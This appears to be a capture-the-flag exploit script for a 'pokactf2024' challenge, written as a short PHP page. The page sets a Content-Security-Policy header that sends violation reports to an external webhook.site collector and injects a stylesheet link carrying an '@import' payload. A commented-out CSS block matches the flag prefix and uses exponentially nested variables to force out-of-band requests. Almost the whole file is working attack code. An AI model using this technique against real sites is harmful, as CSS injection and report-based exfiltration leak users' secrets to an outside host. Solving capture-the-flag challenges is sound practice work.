<?php
header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/4c7d9978-18f2-4ce6-ab5f-d6c1f2e8fbcd;");
echo '<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import \'">';
echo "<a>hi</a>";
?>
<!-- <style>
h1[flag^="pokactf2024{"] {
    --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
    --b: var(--a),var(--a),var(--a),var(--a),var(--a);
    --c: var(--b),var(--b),var(--b),var(--b),var(--b);
    --d: var(--c),var(--c),var(--c),var(--c),var(--c);
    --e: var(--d),var(--d),var(--d),var(--d),var(--d);
    --f: var(--e),var(--e),var(--e),var(--e),var(--e);
    --g: var(--f),var(--f),var(--f),var(--f),var(--f);
};
* {
    background-image: var(--g);
};
</style> -->


